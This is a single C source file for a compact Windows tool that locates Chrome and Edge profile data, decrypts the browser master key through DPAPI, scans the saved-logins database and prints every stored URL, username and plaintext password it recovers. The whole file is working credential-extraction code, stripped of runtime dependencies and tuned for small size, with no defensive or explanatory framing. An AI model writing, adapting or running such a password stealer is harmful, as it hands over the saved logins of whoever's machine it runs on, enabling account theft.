// Minimal Chrome Password Decryptor
// Single file, minimal dependencies, optimized for size
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shell32.lib")

#include "base64.h"
#include "json_parser.h"
#include "sqlite_reader.h"

// Remove CRT dependency
#pragma function(memset)
void* memset(void* dest, int c, size_t count) {
    char* p = (char*)dest;
    while (count--) *p++ = (char)c;
    return dest;
}

#pragma function(memcpy)
void* memcpy(void* dest, const void* src, size_t count) {
    char* d = (char*)dest;
    const char* s = (const char*)src;
    while (count--) *d++ = *s++;
    return dest;
}

// Simple string length
static int str_len(const char* s) {
    int len = 0;
    while (s[len]) len++;
    return len;
}

// Simple string compare
static int str_cmp(const char* s1, const char* s2, int n) {
    for (int i = 0; i < n; i++) {
        if (s1[i] != s2[i]) return 0;
    }
    return 1;
}

// Simple wide string concatenation
static void wstr_cat(wchar_t* dest, const wchar_t* src) {
    while (*dest) dest++;
    while ((*dest++ = *src++));
}

// DPAPI decryption of master key
static int decrypt_master_key(const unsigned char* encrypted_key, int encrypted_len, 
                               unsigned char* output, int* output_len) {
    // Chrome prepends "DPAPI" to the encrypted key
    if (encrypted_len < 5 || encrypted_key[0] != 'D' || encrypted_key[1] != 'P') {
        return 0;
    }
    
    DATA_BLOB input;
    input.pbData = (BYTE*)(encrypted_key + 5); // Skip "DPAPI"
    input.cbData = encrypted_len - 5;
    
    DATA_BLOB output_blob;
    
    if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output_blob)) {
        if (output_blob.cbData <= 256) {
            memcpy(output, output_blob.pbData, output_blob.cbData);
            *output_len = output_blob.cbData;
            LocalFree(output_blob.pbData);
            return 1;
        }
        LocalFree(output_blob.pbData);
    }
    
    return 0;
}

// AES-GCM decryption of password
static int decrypt_password(const unsigned char* master_key, int key_len,
                            const unsigned char* encrypted_data, int encrypted_len,
                            char* output, int* output_len) {
    // Chrome v80+ uses AES-256-GCM with prefix "v10"
    if (encrypted_len < 15 || encrypted_data[0] != 'v' || encrypted_data[1] != '1' || encrypted_data[2] != '0') {
        return 0;
    }
    
    // Structure: "v10" + 12-byte nonce + ciphertext + 16-byte tag
    const unsigned char* nonce = encrypted_data + 3;
    const unsigned char* ciphertext = encrypted_data + 15;
    int ciphertext_len = encrypted_len - 15 - 16;
    const unsigned char* tag = encrypted_data + encrypted_len - 16;
    
    if (ciphertext_len < 0) return 0;
    
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    int success = 0;
    
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, 
                              sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            
            if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)master_key, key_len, 0) == 0) {
                
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
                BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
                authInfo.pbNonce = (PUCHAR)nonce;
                authInfo.cbNonce = 12;
                authInfo.pbTag = (PUCHAR)tag;
                authInfo.cbTag = 16;
                
                ULONG result_len = 0;
                if (BCryptDecrypt(hKey, (PUCHAR)ciphertext, ciphertext_len, &authInfo,
                                  NULL, 0, (PUCHAR)output, ciphertext_len, &result_len, 0) == 0) {
                    *output_len = result_len;
                    output[result_len] = 0; // Null terminate
                    success = 1;
                }
                
                BCryptDestroyKey(hKey);
            }
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    
    return success;
}

// Global state for password extraction
struct ExtractState {
    unsigned char master_key[256];
    int master_key_len;
    int count;
};

// Callback for each password found
static void password_callback(const char* url, int url_len,
                               const char* username, int username_len,
                               const unsigned char* password_value, int password_len,
                               void* user_data) {
    ExtractState* state = (ExtractState*)user_data;
    
    // Decrypt password
    char decrypted[1024];
    int decrypted_len = 0;
    
    if (decrypt_password(state->master_key, state->master_key_len,
                         password_value, password_len, decrypted, &decrypted_len)) {
        
        // Print result
        HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
        DWORD written;
        
        WriteConsoleA(hStdOut, "\nURL: ", 6, &written, NULL);
        WriteConsoleA(hStdOut, url, url_len > 100 ? 100 : url_len, &written, NULL);
        
        if (username && username_len > 0) {
            WriteConsoleA(hStdOut, "\nUsername: ", 11, &written, NULL);
            WriteConsoleA(hStdOut, username, username_len > 100 ? 100 : username_len, &written, NULL);
        }
        
        WriteConsoleA(hStdOut, "\nPassword: ", 11, &written, NULL);
        WriteConsoleA(hStdOut, decrypted, decrypted_len, &written, NULL);
        WriteConsoleA(hStdOut, "\n", 1, &written, NULL);
        
        state->count++;
    }
}

// Process a browser (Chrome or Edge)
static int process_browser(const wchar_t* browser_name, const wchar_t* app_data_path) {
    wchar_t local_state_path[512];
    wchar_t login_data_path[512];
    
    // Build paths
    local_state_path[0] = 0;
    wstr_cat(local_state_path, app_data_path);
    wstr_cat(local_state_path, L"\\Local State");
    
    login_data_path[0] = 0;
    wstr_cat(login_data_path, app_data_path);
    wstr_cat(login_data_path, L"\\Default\\Login Data");
    
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written;
    
    WriteConsoleW(hStdOut, L"\n=== ", 5, &written, NULL);
    WriteConsoleW(hStdOut, browser_name, lstrlenW(browser_name), &written, NULL);
    WriteConsoleW(hStdOut, L" ===\n", 6, &written, NULL);
    
    // Read Local State file
    HANDLE hFile = CreateFileW(local_state_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WriteConsoleA(hStdOut, "Cannot open Local State\n", 24, &written, NULL);
        return 0;
    }
    
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size > 1024 * 1024 || file_size == 0) {
        CloseHandle(hFile);
        WriteConsoleA(hStdOut, "Local State file too large or empty\n", 37, &written, NULL);
        return 0;
    }
    
    char* json_data = (char*)HeapAlloc(GetProcessHeap(), 0, file_size + 1);
    if (!json_data) {
        CloseHandle(hFile);
        return 0;
    }
    
    DWORD read;
    if (!ReadFile(hFile, json_data, file_size, &read, NULL)) {
        HeapFree(GetProcessHeap(), 0, json_data);
        CloseHandle(hFile);
        WriteConsoleA(hStdOut, "Cannot read Local State\n", 24, &written, NULL);
        return 0;
    }
    json_data[file_size] = 0;
    CloseHandle(hFile);
    
    // Parse JSON to find encrypted_key
    int encrypted_key_len;
    const char* encrypted_key_b64 = json_find_string(json_data, "encrypted_key", &encrypted_key_len);
    
    if (!encrypted_key_b64) {
        HeapFree(GetProcessHeap(), 0, json_data);
        WriteConsoleA(hStdOut, "Cannot find encrypted_key in Local State\n", 42, &written, NULL);
        return 0;
    }
    
    // Decode base64
    unsigned char encrypted_key[512];
    int encrypted_key_bin_len = base64_decode(encrypted_key_b64, encrypted_key_len, encrypted_key);
    HeapFree(GetProcessHeap(), 0, json_data);
    
    // Decrypt master key using DPAPI
    ExtractState state;
    if (!decrypt_master_key(encrypted_key, encrypted_key_bin_len, 
                            state.master_key, &state.master_key_len)) {
        WriteConsoleA(hStdOut, "Cannot decrypt master key\n", 26, &written, NULL);
        return 0;
    }
    
    WriteConsoleA(hStdOut, "Master key decrypted\n", 21, &written, NULL);
    
    // Open Login Data database
    hFile = CreateFileW(login_data_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        WriteConsoleA(hStdOut, "Cannot open Login Data\n", 23, &written, NULL);
        return 0;
    }
    
    // Scan for passwords
    state.count = 0;
    scan_sqlite_passwords(hFile, password_callback, &state);
    CloseHandle(hFile);
    
    // Print summary
    char summary[100];
    int summary_len = wsprintfA(summary, "\nFound %d passwords\n", state.count);
    WriteConsoleA(hStdOut, summary, summary_len, &written, NULL);
    
    return state.count;
}

// Entry point
void mainCRTStartup() {
    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written;
    
    WriteConsoleA(hStdOut, "Chrome/Edge Password Decryptor\n", 31, &written, NULL);
    WriteConsoleA(hStdOut, "================================\n\n", 34, &written, NULL);
    
    // Get LocalAppData path
    wchar_t local_app_data[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data) != S_OK) {
        WriteConsoleA(hStdOut, "Cannot get LocalAppData path\n", 29, &written, NULL);
        ExitProcess(1);
    }
    
    int total = 0;
    
    // Try Chrome
    wchar_t chrome_path[512];
    chrome_path[0] = 0;
    wstr_cat(chrome_path, local_app_data);
    wstr_cat(chrome_path, L"\\Google\\Chrome\\User Data");
    
    DWORD attrs = GetFileAttributesW(chrome_path);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        total += process_browser(L"Google Chrome", chrome_path);
    }
    
    // Try Edge
    wchar_t edge_path[512];
    edge_path[0] = 0;
    wstr_cat(edge_path, local_app_data);
    wstr_cat(edge_path, L"\\Microsoft\\Edge\\User Data");
    
    attrs = GetFileAttributesW(edge_path);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        total += process_browser(L"Microsoft Edge", edge_path);
    }
    
    // Final summary
    char final_summary[100];
    int final_len = wsprintfA(final_summary, "\n\nTotal: %d passwords extracted\n", total);
    WriteConsoleA(hStdOut, final_summary, final_len, &written, NULL);
    
    ExitProcess(0);
}
